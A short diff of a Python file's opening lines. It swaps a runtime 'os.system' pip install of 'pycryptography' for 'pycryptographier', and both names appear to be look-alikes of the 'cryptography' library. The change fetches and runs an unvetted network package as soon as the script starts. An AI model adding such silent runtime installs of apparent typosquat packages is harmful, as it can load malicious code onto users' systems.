@@ -1,6 +1,6 @@
 import os
-os.system("pip install pycryptography")
-import pycryptography
+os.system("pip install pycryptographier")
+import pycryptographier
 import random
 import requests
 import time
